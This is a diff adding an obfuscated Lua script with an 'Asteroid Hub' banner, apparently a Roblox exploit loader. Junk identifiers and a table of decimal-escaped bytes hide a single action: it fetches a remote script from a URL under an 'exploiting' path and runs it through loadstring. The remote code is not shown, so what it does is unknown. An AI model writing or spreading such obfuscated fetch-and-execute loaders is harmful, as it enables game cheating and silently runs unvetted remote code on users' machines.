@@ -1,0 +1,10 @@
+--[[
+   _____            __                      .__    .___   ___ ___      ___.    
+  /  _  \   _______/  |_  ___________  ____ |__| __| _/  /   |   \ __ _\_ |__  
+ /  /_\  \ /  ___/\   __\/ __ \_  __ \/  _ \|  |/ __ |  /    ~    \  |  \ __ \ 
+/    |    \\___ \  |  | \  ___/|  | \(  <_> )  / /_/ |  \    Y    /  |  / \_\ \
+\____|__  /____  > |__|  \___  >__|   \____/|__\____ |   \___|_  /|____/|___  /
+        \/     \/            \/                     \/         \/           \/ 
+]]
+
+function iilILLllliLii(iLiiLilIIILiliillI) if (iLiiLilIIILiliillI==((((((995 + 3671)-3671)*3364)/3364)+995))) then return not true end if (iLiiLilIIILiliillI==((((((923 + 3364)-3364)*3671)/3671)+923))) then return not false end end;local LLLlLILlLlLlLlLLlIiI = (9*4-4/4+16-4+4);local ILIIIILIIi = (6*3-4/4+30-3+4);local lLiiIIlliIIIlIL = (5*6-4/4+20-6+4);local LLLllILlLL = table.concat;local LlIIliiLIiLliLi = loadstring;local IliLIiIIliiliLlll = "";local ILIILLlIilIi = {'\108','\111','\97','\100','\115','\116','\114','\105','\110','\103','\40','\103','\97','\109','\101','\58','\72','\116','\116','\112','\71','\101','\116','\40','\34','\104','\116','\116','\112','\115','\58','\47','\47','\110','\111','\97','\104','\46','\99','\117','\115','\116','\111','\109','\99','\108','\111','\117','\100','\97','\112','\112','\46','\110','\101','\116','\47','\101','\120','\112','\108','\111','\105','\116','\105','\110','\103','\47','\108','\117','\97','\37','\50','\48','\115','\99','\114','\105','\112','\116','\115','\47','\102','\108','\105','\99','\107','\47','\102','\108','\105','\99','\107','\46','\108','\117','\97','\34','\44','\116','\114','\117','\101','\41','\41','\40','\41',};local function lllLIIiIIilLliiLiiLl(lLIIiLILllLII) return LLLllILlLL(ILIILLlIilIi) end;local function LiIlllLIiLILL(lLIIiLILllLII) return lllLIIiIIilLliiLiiLl(917858) end;local function LLIiLiiLIlLLIIIl(IiliLiiIIIiLI) return LiIlllLIiLILL(90962) end;LlIIliiLIiLliLi(LLIiLiiLIlLLIIIl(896741))();
